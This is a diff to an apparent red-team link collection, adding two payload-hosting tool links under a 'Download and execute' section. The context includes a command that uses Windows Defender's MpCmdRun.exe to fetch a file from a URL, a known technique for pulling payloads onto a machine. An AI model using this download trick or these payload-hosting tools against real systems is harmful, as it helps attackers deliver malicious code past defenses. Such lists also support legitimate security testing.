@@ -119,6 +119,8 @@ Collection in early stage - more details will be added (URL/Description).
 ## Download and execute
 
 * [Download via Defender](https://twitter.com/mohammadaskar2/status/1301263551638761477)
+* [Host your payloads and serve them based on your conditions](https://github.com/t3l3machus/Synergy-httpx)
+* [Host redteam payloads](https://github.com/outflanknl/RedFile)
 ![Defender download](https://pbs.twimg.com/media/Eg8ESSWWAAACTGo?format=jpg&name=large)
 * (You can use C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2008.9-0\MpCmdRun.exe -url <url> -path <local-path> to download your file using Windows defender itself.)
   
